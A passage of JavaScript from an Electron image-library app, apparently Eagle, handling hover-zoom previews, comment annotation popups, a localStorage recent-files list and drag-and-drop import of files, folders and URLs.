        // y 轴一律置图片中心点对齐，然后把超过的部分抓回来
        // 图靠左，x 轴位置 = 当前缩图 x - 放大后图片宽
        // 图靠右，x 轴位置 = 当前缩图 x + 缩图宽
        else if (finalArea.name === "left") {
            imageHeight = Math.min(finalArea.h, image.height);
            imageWidth = Math.min(finalArea.w, imageHeight / image.height * image.width, image.width);
            imageWidth += (boxWidth*1/1 - 10);
            imageWidth = Math.min(imageWidth, image.width);
            imageHeight = Math.min(finalArea.h, imageWidth / image.width * image.height);
            imageWidth = imageHeight / image.height * image.width;
            // imageHeight = Math.min(imageHeight, imageWidth / image.width * image.height);
            transform = `translateX(${imageX + 10}px) translateY(${imageY}px) ${rotateString}`;
        }
        else if (finalArea.name === "right") {
            imageHeight = Math.min(finalArea.h, image.height);
            imageWidth = Math.min(finalArea.w, imageHeight / image.height * image.width, image.width);
            imageWidth += (boxWidth*1/1 - 10);
            imageWidth = Math.min(imageWidth, image.width);
            imageHeight = Math.min(finalArea.h, imageWidth / image.width * image.height);
            imageWidth = imageHeight / image.height * image.width;
            // imageWidth = Math.min(finalArea.w, imageHeight / image.height * image.width, image.width);
            // imageHeight = Math.min(imageHeight, imageWidth / image.width * image.height);
            transform = `translateX(${imageX - 10}px) translateY(${imageY}px) ${rotateString}`;
        }

        if (x + boxWidth*1/2 > windowWidth / 2) {
            imageX = x - imageWidth - 15 + boxWidth*1/1;
        }
        else {
            imageX = x  + 15;
        }

        if (y > windowHeight / 2) {
            imageY = y + Math.min(boxHeight*1/4, 20);
        }
        else {
            imageY = y + Math.min(boxHeight*1/4, 20);
        }

        if (finalArea.name === "top") {
            imageY = y + Math.min(boxHeight*1/4, 20) - imageHeight;
            imageX = x;
        }
        else if (finalArea.name === "bottom") {
            imageY = y + Math.min(boxHeight*1/4, 20);
            imageX = x;
        }

        var ofy;
        if (imageY + imageHeight > windowHeight) {
            ofy = (imageY + imageHeight) - windowHeight;
            imageY -= ofy;
            imageY += 10;
        }
        else if (imageY < 0) {
            imageY = 10;
        }

        var ofx;
        if (imageX + imageWidth > windowWidth) {
            ofx = (imageX + imageWidth) - windowWidth;
            imageX -= ofx;
            imageX += 10;
        }
        else if (imageX < 0) {
            imageX = 10;
        }

        if (finalArea.name === "top") {
            transform = `translateX(${imageX}px) translateY(${imageY}px) ${rotateString}`;
        }
        else if (finalArea.name === "bottom") {
            transform = `translateX(${imageX}px) translateY(${imageY}px) ${rotateString}`;
        }
        else if (finalArea.name === "left") {
            transform = `translateX(${imageX}px) translateY(${imageY}px) ${rotateString}`;
        }
        else if (finalArea.name === "right") {
            transform = `translateX(${imageX}px) translateY(${imageY}px) ${rotateString}`;
        }

        $hoverImage.css({
            height: parseInt(imageHeight),
            // transform: transform,
            // opacity: 0,
        });

        var loadRaw = function () {
            clearTimeout(HoverPreview.loadRawTimeout);
            HoverPreview.loadRawTimeout = setTimeout(function () {
                var rawPath = $bodyScope.getRawUrl(image);
                var img = new Image();
                img.onload = function() {
                    $hoverImage.attr("src", rawPath);
                };
                img.src = rawPath;
            }, 50);
        }

        if ("gif webp png jpg jpeg bmp ico".indexOf(image.ext) > -1 ) {
            if (image.width * image.height < 56000000 && (!image.noThumbnail || (imageWidth > 800 || imageHeight > 800)) ) {
                console.log("loadRaw");
                loadRaw();
            }
        }
        HoverPreview.$container.addClass("show");
        HoverPreview.showTimeout = setTimeout(function () {
            $hoverImage.css({
                transform: `translateX(${imageX}px) translateY(${imageY}px) ${rotateString}`,
                opacity: 1,
            });
        }, 50);
    },
    hide: function () {
        clearTimeout(HoverPreview.showTimeout);
        HoverPreview.isShow = false;
        if (HoverPreview.$container.hasClass("show")) {
            HoverPreview.$container.removeClass("show");
            HoverPreview.$container.find("img").css({
                opacity: 0,
            });
        }
    }
};

// $("#box-container").on('mouseover', '.box .thumbnail', function(event) {
//     clearTimeout(HoverPreview.keyupTimeout);
//     HoverPreview.lastElem = this;

//     if (HoverPreviewKeydown) {
//         HoverPreview.show();
//         return;
//     }
// });

// $("#box-container").on('mouseleave', '.box .thumbnail', function(event) {
//     if (HoverPreview.lastElem) {
//         HoverPreview.hide();
//     }
//     HoverPreview.lastElem = undefined;
// });

$("body").on('mouseover', '.box', throttle(function(event) {
    event.stopPropagation();
    clearTimeout(HoverPreview.keyupTimeout);
    let thumbnail = $(this).find(".thumbnail")[0];
    HoverPreview.lastElem = thumbnail;
    if (HoverPreviewKeydown) {
        HoverPreview.show();
        return;
    }
}, 200, true));

$("body").on('mouseover', '.box', throttle(function(event) {
    event.stopPropagation();
    clearTimeout(HoverPreview.keyupTimeout);
    let thumbnail = $(this).find(".thumbnail")[0];
    HoverPreview.lastElem = thumbnail;
    if (HoverPreviewKeydown) {
        HoverPreview.show();
        return;
    }
}, 200, true));

$("body").on('mouseleave', '.box', throttle(function(event) {
    event.stopPropagation();
    if (HoverPreview.lastElem) {
        HoverPreview.hide();
    }
    // HoverPreview.lastElem = undefined;
}, 200, true));


$("body").on('mouseover', '.box .thumbnail .zoom-btn', function(event) {
    if ($bodyScope.preferences.habits.hoverZoom === "on") {
        clearTimeout(HoverPreview.zoomBtnTimeout);
        HoverPreview.lastElem = this.parentElement;
        HoverPreview.zoomBtnTimeout = setTimeout(function () {
            // if (isMouseMoving) {
                HoverPreview.show();
            // }
        }, 200);
    }
});

$("body").on('mouseleave', '.box .thumbnail .zoom-btn', function(event) {
    if ($bodyScope.preferences.habits.hoverZoom === "on") {
        clearTimeout(HoverPreview.zoomBtnTimeout);
        if (HoverPreview.lastElem) {
            HoverPreview.hide();
        }
    }
});


var HoverPreviewKeydown = false;
$(window).on("keydown.hover-preview", function (event) {
    if (HoverPreviewKeydown || event.ctrlKey || event.metaKey || event.shiftKey) return;

    // Check the currently focused element
    const focusedElement = document.activeElement;
    const tagName = focusedElement.tagName.toLowerCase();

    // Check if the focused element is an input, textarea, select, or contenteditable
    if (tagName === 'input' || tagName === 'textarea' || tagName === 'select' || focusedElement.isContentEditable) {
        return;
    }

    if ($bodyScope.isDetailMode) return;
    
    if (event.keyCode === 90) {
        HoverPreviewKeydown = true;
        HoverPreview.show();
    }
});

$(window).on("keyup.hover-preview", function (event) {
    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
    if (event.keyCode === 90) {
        HoverPreviewKeydown = false;
        HoverPreview.hide();
    }
});
var AnnotationPreview = {
    hovering: false,
    isShow: false,
    lastElem: undefined,
    hoverTimeout: undefined,
    hideTimeout: undefined,
    inputTimeout: undefined,
    $container: undefined,
    show: function (autoFocus) {

        if (!AnnotationPreview.lastElem) return;

        AnnotationPreview.isShow = true;
        AnnotationPreview.$container = $("#annotation-preview-container");
        var $annotationBox = AnnotationPreview.$container.find(".annotation-box");
        var $annotationArrow = AnnotationPreview.$container.find(".annotation-arrow");
        var commentScope = angular.element(AnnotationPreview.lastElem).scope();

        if (!commentScope) return;
        var comment = commentScope.comment;

        // if ($bodyScope.currentComment !== comment) {
            $bodyScope.currentComment = comment;
            $bodyScope.$apply();
            let $input = $("#annotation-preview-container .annotation-box");
            $input.html(comment.annotation);
            try {
                document.execCommand('selectAll', false, null);
                document.getSelection().collapseToEnd();
            }
            catch (err) {}
        // }

        var offset = AnnotationPreview.lastElem.getClientRects()[0];
        if (!offset) return;
        var x = offset.left;
        var y = offset.top;
        var width = offset.width;
        var height = offset.height;
        var displayX = x + width / 2;

        var windowWidth = $(window).width();
        var windowHeight = $(window).height();

        var finalX = displayX;
        var finalY = y - 2;

        AnnotationPreview.$container.addClass("show");

        var boxWidth = $annotationBox.width();
        var boxHeight = $annotationBox.outerHeight();
        var offsetX = 0;
        var offsetY = 0;

        // if (finalX + boxWidth/2 > windowWidth) {
        // 	offsetX = (finalX + boxWidth/2 - windowWidth);
        // }
        // else if (finalX < boxWidth/2) {
        // 	finalX = boxWidth;
        // }

        if (finalY + boxHeight/2 > windowHeight) {
            offsetY = (finalY + boxHeight/2 - windowHeight);
        }
        else if (finalY < boxHeight/2) {
            finalY = boxHeight + 6;
        }

        $annotationBox.css({
        	left: finalX - offsetX,
        	top: finalY - offsetY
        });

        $annotationArrow.css({
        	left: finalX - 5,
        	top: finalY - 6
        });
        
        AnnotationPreview.$container.addClass("show");

        if (autoFocus) {
        	setTimeout(function () {
        		AnnotationPreview.focus();
        	}, 100);
        }
    },
    focus: function () {
    	try {
	    	var $box = $("#annotation-preview-container .annotation-box");
	    	if ($box.length > 0) {
	    		$box.focus();
	    		document.execCommand('selectAll', false, null);
	    		var selection = document.getSelection();
	    		if (selection) {
	    			selection.collapseToEnd();
	    		}
	    	}
    	}
    	catch (err) {}
    },
    blur: function () {
        try {
        	setTimeout(function () {
        		$("#annotation-preview-container .annotation-box").blur();
	    		window.getSelection().removeAllRanges();
        	}, 100)
	    	$timeout(function () {
	    		$bodyScope.currentComment = undefined;
	    	}, 1);
    	}
    	catch (err) {}
    },
    hide: function () {
        AnnotationPreview.isShow = false;
        AnnotationPreview.$container = $("#annotation-preview-container");
        if (AnnotationPreview.$container.hasClass("show")) {
            AnnotationPreview.$container.removeClass("show");
        }
        // $("#annotation-preview-container-input").focus();
        // setTimeout(function () {
        //     $("#annotation-preview-container-input").blur();
        // }, 50);
    }
};

$("body").on('paste input', '#annotation-preview-container .annotation-box', function(event) {
    const $this = $(this);
    if ($this.data('before') === $this.html()) return;

	var that = this;
	var comment = $bodyScope.currentComment;
	clearTimeout(AnnotationPreview.inputTimeout);
	AnnotationPreview.inputTimeout = setTimeout(function () {

        var html = $(that).html();
        html = html.replaceAll("&amp;", "&");
        comment.annotation = html;
        $bodyScope.$evalAsync();

		console.log(comment.annotation);
		if (comment && comment.annotation !== undefined) {
	    	if ($bodyScope.current) {
	    		ayncsImagesChange([$bodyScope.current]);
                hiddenByCurrentFilter([$bodyScope.current]);
	    	}
	    }
	}, 500);
});

$("body").on('keydown', '#annotation-preview-container .annotation-box', function(event) {
    if (event.keyCode === 13) {
        if (event.shiftKey || event.ctrlKey) {
            event.preventDefault();

            // insert change line to plain text contenteditable
            var selection = window.getSelection();
            var range = selection.getRangeAt(0);
            var br = document.createElement("br");
            range.deleteContents();
            range.insertNode(br);
            range.setStartAfter(br);
            range.setEndAfter(br);
            selection.removeAllRanges();
            selection.addRange(range);
            
            return;
        }
    }
});

$("body").on('focus', '#annotation-preview-container .annotation-box', function(event) {
    const $this = $(this);
    $this.data('before', $this.html());
    if (!$bodyScope.isCommentMode) {
        let $this = $(this);
        event.stopPropagation();
        event.preventDefault();
        setTimeout(function () {
            $this.blur();
        }, 33);
    }
});

$("body").on('mouseover', '#annotation-preview-container .annotation-box', function(event) {
    AnnotationPreview.hovering = true;
});

$("body").on('mouseleave', '#annotation-preview-container .annotation-box', function(event) {
    if ($(document.activeElement).hasClass("annotation-box")) return;
    AnnotationPreview.hovering = false;
    if (AnnotationPreview.lastElem) {
        clearTimeout(AnnotationPreview.hoverTimeout);
        clearTimeout(AnnotationPreview.hideTimeout);
        AnnotationPreview.hide();
    }
});

$("body").on('mouseover', '.content-panel .detail-container .comments .comment', function(event) {;
    if ($(document.activeElement).hasClass("annotation-box")) return;
    clearTimeout(AnnotationPreview.hoverTimeout);
    clearTimeout(AnnotationPreview.hideTimeout);
    AnnotationPreview.lastElem = this;
    AnnotationPreview.hoverTimeout = setTimeout(function () {
    	AnnotationPreview.show();
    }, 30);
});

$("body").on('click', '.content-panel .detail-container .comments .comment', function(event) {;
    clearTimeout(AnnotationPreview.hoverTimeout);
    clearTimeout(AnnotationPreview.hideTimeout);
    AnnotationPreview.lastElem = this;
    AnnotationPreview.hoverTimeout = setTimeout(function () {
        AnnotationPreview.show();
    }, 30);
});

$("body").on('mouseleave', '.content-panel .detail-container .comments .comment', function(event) {
    if ($(document.activeElement).hasClass("annotation-box")) return;
    clearTimeout(AnnotationPreview.hoverTimeout);
    AnnotationPreview.hideTimeout = setTimeout(function () {
        if (AnnotationPreview.lastElem && !AnnotationPreview.hovering) {
            clearTimeout(AnnotationPreview.hoverTimeout);
            clearTimeout(AnnotationPreview.hideTimeout);
            AnnotationPreview.hide();
        }
    }, 50);
});


var RecentFileManager = {
	libraryName: "",
	recentFiles: [],
	recentFilesOrder: {},
	maxHistory: 5000,
	init: function (libraryName) {
		RecentFileManager.libraryName = libraryName;
		let json = localStorage[`eagle.recentFiles.${RecentFileManager.libraryName}`];
		if (json) {
			try {
				RecentFileManager.recentFiles = JSON.parse(json);
				RecentFileManager.calOrders();
			}
			catch (err) {
				RecentFileManager.recentFiles = [];
			}
		}
	},
	calOrders: function () {
		try {
			for (var i = 0; i < RecentFileManager.recentFiles.length; i++) {
				let itemId = RecentFileManager.recentFiles[i];
				RecentFileManager.recentFilesOrder[itemId] = i+1;
			}
		}
		catch (err) {}
	},
	isExists: function (item) {
		if (!item || !item.id) return false;
		return RecentFileManager.recentFilesOrder[item.id];
	},
	addFile: function (item) {
		try {
			if (!RecentFileManager.libraryName) {
				console.error("RecentFileManager.libraryName is empty");
				return;
			}
			if (!item || !item.id) return;
			RecentFileManager.recentFiles.unshift(item.id);
			RecentFileManager.calOrders();
			RecentFileManager.save();
		}
		catch (err) {}
	},
	addFiles: function (items) {
		try {
			if (!RecentFileManager.libraryName) {
				console.error("RecentFileManager.libraryName is empty");
				return;
			}
			if (!items) return;
			if (items.length >= 20) return;
			items.reverse().forEach(function (item) {
				if (!item || !item.id) return;
				RecentFileManager.recentFiles.unshift(item.id);
				RecentFileManager.calOrders();
			});
			RecentFileManager.save();
		}
		catch (err) {}
	},
	clean: function () {
		RecentFileManager.recentFiles = [];
		RecentFileManager.recentFilesOrder = {};
		RecentFileManager.save();
	},
	save: throttle(function () {
		try {
			if (!RecentFileManager.libraryName) {
				console.error("RecentFileManager.libraryName is empty");
				return;
			}
			// 最多保存 5000 個
			RecentFileManager.recentFiles = [...new Set(RecentFileManager.recentFiles)];
			if (RecentFileManager.recentFiles.length > RecentFileManager.maxHistory) {
				RecentFileManager.recentFiles.length = RecentFileManager.maxHistory;
			}
			let json = JSON.stringify(RecentFileManager.recentFiles);
			localStorage[`eagle.recentFiles.${RecentFileManager.libraryName}`] = json;
		}
		catch (err) {}
	}, 1000, true)
};
document.addEventListener('drop', function (e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
});

document.addEventListener('dragover', function (e) {
    e.preventDefault();
    e.stopPropagation();
});

// 註記：
// 避免過多的 angular directive，這使裡使用 HTML5 的 drag and drop 處理所有的檔案拖曳事件
const fsPath = require('path');
var draggingItem;			// 全局變數，用來存放正在拖曳的內容
var draggingItems;
var dragging = false;
var dragCheck = false;
var sended = false;
var ipcRenderer = require('electron').ipcRenderer;
let cancelDragTimeout;
let cancelDragCount = 0;

ipcRenderer.on('ondragend', function(e) {
    dragging = false;
    console.log("ondragend");
});

/**
 * 圖片拖曳事件
 *
 * @param      {<type>}  event   拖曳事件
 */
function onImageDrag (event) {
    event && event.preventDefault();
};

function onDragEnterContainer (event) {
    if (draggingFolder) {
        event.preventDefault();
        return false;
    }
    if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0]) {
        var path = event.dataTransfer.files[0].path;
        event.preventDefault();
        event.stopPropagation();
        event.dataTransfer.dropEffect = "copy"
        if (IS_DIRECTORY.check(path)) {
            dragging = false;
        }
    }
    if (event.dataTransfer && event.dataTransfer.effectAllowed === 'all') {
        event.preventDefault();
    //     if (dragging) {
    //         dragging = false;
    //     }
    }

    if (dragging) {
        return;
    }
    $("#box-container").addClass("drag-accept");
    $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");
    return false
};

function onDragLeaveContainer (event) {
    event.preventDefault();
    event.stopPropagation();
    event.dataTransfer.dropEffect = "copy"
    $("#box-container").removeClass("drag-accept");
    return false;
};

function onMouseMoveContainer (event) {
    event.preventDefault();
    event.stopPropagation();
    if (!dragging) {
        $("#box-container").removeClass("drag-accept");
    }
    return false;
};

/**
 * 拖曳圖片開始事件
 *
 * @param      {<type>}  event   拖曳事件
 */
function onDragStartContainer(event) {

    var isCommentMode = $bodyScope.isCommentMode;
    var isDetailMode = $bodyScope.isDetailMode;

    event && event.preventDefault();
    event && event.stopPropagation();
    if (event.dataTransfer) {
        event.dataTransfer.effectAllowed = "copyMove";
    }
    dragging = true;
    draggingItem = event.target;
    var $box = $(".box").has(event.target);
    var $scope = $bodyScope;
    var selected = $scope.selected;
    var imageHeight = $scope.imageSize.height;
    var target = $scope.getItemByElement($box[0]) || $scope.selected[0];
    draggingItems = $scope.getSelectedItemElements();
    var getBase64Thumbnail = function (item) { 
        try {
            var base64;
            if (item.tagName === "IMG") {
                console.time("toDataURL");
                var canvas = document.createElement('canvas');
                var minSize = 160;
                var maxSize = 120;
                if (process.platform !== 'darwin') {
                    maxSize = 80;
                    minSize = 120;
                }
                var size = Math.max(item.height || item.clientHeight, item.width || item.clientWidth, maxSize);
                size = Math.min(size, minSize);
                ctx = canvas.getContext('2d');
                if (item.naturalWidth < size && item.naturalHeight < size) {
                    canvas.width = item.naturalWidth;
                    canvas.height = item.naturalHeight;
                }
                else {
                    if (item.naturalWidth > item.naturalHeight) {
                        canvas.width = size;
                        canvas.height = item.naturalHeight * size / item.naturalWidth;
                    }
                    else {
                        canvas.height = size;
                        canvas.width = item.naturalWidth * size / item.naturalHeight;
                    }
                }
                if (selected.length <= 1) {
                    ctx.drawImage(item, 0, 0, canvas.width, canvas.height);
                }
                else {
                    ctx.drawImage(item, 0, 8, canvas.width - 8, canvas.height - 8);
					if (process.platform === 'win32') {
						ctx.font = "11px Arial Black";
						ctx.fillStyle = 'white';

						var text = "" + selected.length;
						var metrics = ctx.measureText(text);
						var numberWidth = Math.ceil(metrics.width);
						var rectWith = Math.max(parseInt(numberWidth + 10), 17);
						var textFillX = Math.ceil(rectWith/2 - numberWidth/2);

						ctx.roundRect(canvas.width - rectWith - 4, 0, rectWith, 17, 50);
						ctx.fillStyle = 'rgba(237, 47, 52, 1)';
						ctx.fill();

						ctx.font = "11px Arial Black";
						ctx.fillStyle = 'white';
					
                    	ctx.fillText(text, canvas.width - rectWith - 4 + textFillX, 12);
					}
                }
                if (process.platform === 'darwin') {
                    // base64 = canvas.toDataURL('image/png');
					var canvas2 = document.createElement('canvas');
                    var ctx2 = canvas2.getContext('2d');
                    // canvas2.width = parseInt(1 * canvas.width);
                    canvas2.width = parseInt(2 * canvas.height);
                    canvas2.height = parseInt(2 * canvas.height);

                    ctx2.drawImage(canvas, (canvas2.width / 2 - canvas.width / 2), canvas.height + 12, canvas.width, canvas.height);
                    base64 = canvas2.toDataURL('image/png');
                }
                else {
                    var canvas2 = document.createElement('canvas');
                    var ctx2 = canvas2.getContext('2d');
                    // canvas2.width = parseInt(1 * canvas.width);
                    canvas2.width = parseInt(2 * canvas.width);
                    canvas2.height = parseInt(2 * canvas.height) + 12;

                    ctx2.drawImage(canvas, (canvas2.width / 2 - canvas.width / 2), canvas.height + 12, canvas.width, canvas.height);
                    base64 = canvas2.toDataURL('image/png');
                }
                console.timeEnd("toDataURL");
            }
            console.log(base64)
            return base64;
        }
        catch (err) {
            
        }
    }

    var transforms = selected.map(function (image) {
        return {
            id: image.id,
            name: image.name,
            ext: image.ext,
            width: image.width,
            height: image.height,
            orientation: image.orientation,
        }
    });

    var base64;
    if (draggingItem.tagName === "IMG") {
        base64 = getBase64Thumbnail(draggingItem);
    }
    else {
        let $box = $(draggingItem).parent();
        let $imgs = $box.find(".thumbnail img");
        
        if ($imgs.length > 0) {
            base64 = getBase64Thumbnail($imgs[0]);
        }
        else {
            $imgs = $(draggingItem).find("img");
            if ($imgs.length > 0) {
                base64 = getBase64Thumbnail($imgs[0]);
            }
        }
    }

    console.time("拖拽传送");
    cancelDragCount = 0;
    clearTimeout(cancelDragTimeout);
    requestAnimationFrame(() => {
        var transformsJSON = JSON.stringify(transforms);
        ipcRenderer.send('ondragstart', { images: transformsJSON, target: target, resize: imageHeight, base64: base64 });
        removeBoxAudioPlayer(event);
        cancelDragTimeout = setTimeout(() => {
            $("body").off('mousemove.dragging').on('mousemove.dragging', () => {
                cancelDragCount++;
                console.log(`cancelDragCount: ${cancelDragCount}`)
                if (cancelDragCount > 10) {
                    $("body").off('mousemove.dragging');
                    dragging = false;
                }
            });
        }, 500);
    });
    console.timeEnd("拖拽传送");
    
    setTimeout(function () {
        removePlayingAudios();
    }, 20);
};

/**
 * 圖片拖曳事件結束
 *
 * @param      {Function}  event   拖曳事件
 */

// $("body").on('dragstop', '.box-wrapper img', onDragEndContainer);
// $("body").on('dragstart', '.box-wrapper img', onDragStartContainer);
// $("body").on('darg', '.box-wrapper img', onImageDrag);

function onDragEndContainer(event) {
    $(".folder-node.drop").removeClass("drop");
    $(".sidebar-container .item.drop").removeClass("drop");
    $("#box-container").removeClass("drag-accept");
    var $scope = angular.element("body").scope();
    var selected = $scope.selected;
    draggingItem = undefined;
    draggingItems = undefined;
    dragging = false;
};

var walk = function(dir) {
    var results = []
    var list = fs.readdirSync(dir);
    for (let i = 0; i < list.length; i++) {
        let file = dir + '/' + list[i];
        let ext = getExt({ path: file });
        if (ext) {
            if (!junk.is(list[i])) {
                results.push(file);
            }
        }
        else {
            // var stat = fs.statSync(file)
            if (file.endsWith(".pxd")) {
                results.push(file);
            }
            else if (IS_DIRECTORY.check(file)) {
                results = results.concat(walk(file));
            }
            else {
                if (!junk.is(list[i])) {
                    results.push(file);
                }
            }
        }
    // }
    // list.forEach(function(file) {
        // file = dir + '/' + file
        // var stat = fs.statSync(file)
        // Note: 特殊格式档案会被误判成文件夹
        // if (file.endsWith(".pxd")) results.push(file);
        // else if (stat && stat.isDirectory()) results = results.concat(walk(file))
        // else results.push(file)
    // })
    }
    return results
}

function onDropInspector (event) {
    dragging = false;
    return;
}

function onDragOverContainer (event) {
    event.preventDefault();
    event.stopPropagation();
};

/**
 * 將檔案拖曳置中央的內容區域中
 *
 * @param      {<type>}  event   拖曳事件
 */
function onDropContainer(event) {

    if (dragging) {
        dragging = false;
        return;
    }

    event && event.preventDefault();
    event && event.stopPropagation();

    var path = require('path');
    var ipcRenderer = require('electron').ipcRenderer;
    var $scope = angular.element("body").scope();
    var folder = $scope.currentFolder;
    var dragUrl = event.dataTransfer && jQuery("<div></div>").html(event.dataTransfer.getData("text/html")).find("img").attr("src");
    var files = event.dataTransfer && event.dataTransfer.files;
    var dragFile = false;

    if (!dragUrl) {
        if (is.url(event.dataTransfer.getData("text/plain"))) {
            dragUrl = event.dataTransfer.getData("text/plain");
        }
        // if (dragUrl && dragUrl.indexOf("data:image") === -1 ) {
        //     dragUrl = undefined;
        // }
        if (files && files[0] && files[0].path) {
            dragFile = true;
        }
    }
    console.log(dragFile);

    $("#box-container").removeClass("drag-accept");

    if (!dragging && files.length == 1 && files[0].path.indexOf(".eaglepack") !== -1) {
        var file = files[0];
        var packPath = file.path;
        ipcRenderer.send("open-eaglepack", {
            path: packPath,
            folderId: folder && folder.id
        });
        return;
    }
	else if (!dragging && files.length == 1 && files[0].path.indexOf(".eagleplugin") !== -1) {
        let file = files[0];
        let pluginPath = file.path;
        ipcRenderer.send("open-eagleplugin-file", {
            path: pluginPath
        });
        return;
    }
    else if (!dragging && files.length == 1 && files[0].path.endsWith(".library")) {
        var file = files[0];
        var libraryPath = file.path;
        ipcRenderer.send('open-library', libraryPath);
        return;
    }

    if (!dragging && files && files[0] && files[0].path) {

        // 如果文件夾名稱過長，路徑會變成很奇怪的符號
        if (files[0] && !fs.existsSync(files[0].path)) {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon error"></div>
                        <h4 class="alert-title">${i18n.__("Dialog.PathTooLong.Title")}</h4>
                        <p class="alert-desc">${i18n.__("Dialog.PathTooLong.Description")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 360,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("general.close"),
            }).then(function () {});
            electronLog && electronLog.error("[app] Unable to add local folder, beacuse the path is too long: " + files[0].path);
            return;
        }

        console.time("拖曳档案事件");
        $scope.showUploadQueue();

        var fds = [];
        var notSupportFiles = [];   // 不支持添加的文件


        for (var i = 0; i < files.length; i++) {
        // for (var i = files.length - 1; i >= 0; i--) {
            var filePath = files[i].path;
            var lowercase = filePath.toLowerCase();
            var ext = getExt(files[i]);
            if (ext) {
                // var ext = getExt(files[i]);
                if (EagleConfig.SUPPORT_FORMATS[ext]) {
                    files[i].type = "image/" + ext;
                    fds.push(files[i]);
                }
                else if (filePath.indexOf("svg") !== -1 || filePath.indexOf("icns") !== -1 || filePath.indexOf("ico") !== -1) {
                    fds.push(files[i]);
                }
                else if (!IS_HIDDEN_FILE.check(lowercase)) {
                    fds.push(files[i]);
                }
            }
            // 使用者拖曳資料夾
            else if (IS_DIRECTORY.check(filePath)) {
                var dirFiles = walk(filePath);
                if (dirFiles && dirFiles.length !== 0) {
                    var now = Date.now();
                    dirFiles.forEach(function (p, index) {
                        var fpath = p;
                        // var stat = fs.statSync(fpath);
                        var f = {
                            name: fsPath.basename(fpath),
                            // size: stat.size,
                            path: fpath,
                            lastModified: now,
                        };
                        var ext = getExt(f);
                        if (EagleConfig.SUPPORT_FORMATS[ext]) {
                            f.type = "image/" + ext;
                            fds.push(f);
                        }
                        else if (fpath.indexOf("svg") !== -1) {
                            f.type = "image/svg+xml";
                            fds.push(f);
                        }
                        else if (fpath.indexOf("icns") !== -1) {
                            f.type = "icns";
                            fds.push(f);
                        }
                        else if (fpath.indexOf("ico") !== -1) {
                            f.type = "ico";
                            fds.push(f);
                        }
                        else {
                            fds.push(f);
                            // notSupportFiles.push(f);
                        }
                    });
                }
                else {
                    $scope.hideUploadQueue();
                }
            }
            else {
                fds.push(files[i]);
                // notSupportFiles.push(files[i]);
            }
        }

        if (fds.length == 0 && files.length == 1 && notSupportFiles.length > 0) {
            $scope.hideUploadQueue();
        }
        else {
            // let reason = (process.platform === 'darwin')? i18n.__("Dialog.NotSupport.Format.Descript.Mac") :  i18n.__("Dialog.NotSupport.Format.Descript.Windows");
            // notSupportFiles.forEach(function (file) {
            //     $bodyScope.errorList.push({
            //         type: 'ADD_ERROR',
            //         object: { 
            //             name: file.name,
            //             path: file.path 
            //         },
            //         reason: reason
            //     });
            // });
            console.log("收到 Drop，準備添加");
            // Windows 拖拽顺序无法对应当前 explorer，所以这里自己做了排序
            if (process.platform === 'win32') { sortByAZ(fds); }
            $scope.uploadFiles(fds, folder);
            if (folder) { electronLog && electronLog.info(`[app] Drop ${fds.length} files to ${folder.name}(${folder.id})(Center), path: ${fds[0].path}`); }
            else { electronLog && electronLog.info(`[app] Drop ${fds.length} files to All(Center), path: ${fds[0].path}`); }
            $scope.$evalAsync();
        }
        console.timeEnd("拖曳档案事件");
    }
    // else if (!dragging && dragFile) {
    //     $scope.uploadDraggingBoard(folder, dragUrl);
    //     $scope.showUploadQueue();
    //     console.log("上传记忆体内的图片");
    // }
    else if (!dragging && dragUrl) {
        if (is.url(dragUrl)) {
        // if (is.url(dragUrl) && dragUrl.indexOf("data:image" !== -1)) {
            $scope.showUploadQueue();
        }
        if (is.url(dragUrl)) {
            $scope.uploadUrl(dragUrl, folder);
            if (folder) { electronLog && electronLog.info(`[app] Drop url: ${dragUrl} to ${folder.name}(${folder.id})（Center）`); }
            else { electronLog && electronLog.info(`[app] Drop url ${dragUrl} to All(Center)`); }
        }
        else if (dragUrl.indexOf("data:image" > -1) ) {
            $scope.uploadUrl(dragUrl, folder);
            if (folder) { electronLog && electronLog.info(`[app] Drop base64 url to: ${folder.name}(${folder.id})(Center)`); }
            else { electronLog && electronLog.info(`[app] Drop base64 url to All(Center)`); }
        }
        else {
            var $filter = angular.element(document.body).injector().get('$filter');
            var html = (process.platform === 'darwin')? $filter('i18n')("Dialog.NotSupport.Format.Descript.Mac") :  $filter('i18n')("Dialog.NotSupport.Format.Descript.Windows");
            $scope.hideUploadQueue();
            swal({
                title: i18n.__("Dialog.NotSupport.Format.Title"),
                html: html,
                showCloseButton: false, showCancelButton: false, allowOutsideClick: true, focusConfirm: true, focusCancel: false, padding: 24,
                width: 360,
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("Dialog.NotSupport.Format.Buttom"),
            }).then(function () {});
        }
    }
    dragging = false;
}

var hoverFolderTimeout;
function onDragEnterFolder (event) {

    if (dragging) {
        event && event.preventDefault();
        event && event.stopPropagation();
    }
    // console.log("enter")
    clearTimeout(hoverFolderTimeout);
    // 開始計時，超過0.8s後，自動展開資料夾
    hoverFolderTimeout = setTimeout(function () {
        var isActive = $(".folder-node, .sidebar-container .item").has(event.target).hasClass("drop");
        if (!isActive) return;
        var $scope = angular.element("body").scope();
        var folderScope = angular.element(event.target).scope();
        if (folderScope) {
            var folder = folderScope.node;
            if (folder) {
                folder.isExpand = true;
                $scope.updateSidebarList();
                $scope.$evalAsync();
            }
        }
    }, 800);
    return;
}



/**
 * 當拖曳剛進入 sidebar
 *
 * @param      {<type>}  event   拖曳事件
 */
 var isDraggingFolder = false;
function onDragEnterSidebar(event) {
    // console.log(event.dataTransfer);
    // if (event.dataTransfer && event.dataTransfer.files) {
    //     event && event.preventDefault();
    //     event && event.stopPropagation();
    //     event.dataTransfer.dropEffect = "copy"
    //     if (event.dataTransfer.files.length > 1) return;
    //     if (event.dataTransfer.files.length <= 0) return;
    //     var path = event.dataTransfer.files[0].path;
    //     if (fs.statSync(path).isDirectory()) {
    //         isDraggingFolder = true;
    //     }
    //     else {
    //         isDraggingFolder = false;
    //     }
    // }
    // else {
    //     isDraggingFolder = false;
    // }
    return false;
}

var onDragOverSidebar = throttle(function (event) {
// function onDragOverSidebar(event) {
    event && event.preventDefault();
    event && event.stopPropagation();

